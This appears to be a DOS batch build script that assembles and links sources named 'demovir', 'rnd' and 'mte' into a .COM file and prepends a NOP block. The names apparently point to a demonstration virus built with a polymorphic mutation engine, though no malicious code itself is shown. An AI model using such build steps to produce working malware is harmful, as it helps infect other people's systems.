echo off
tasm demovir
tasm rnd
tasm mte
tlink /x /t demovir rnd mte
copy /b nops.bin+demovir.com tmp >nul
del demovir.com
ren tmp demovir.com
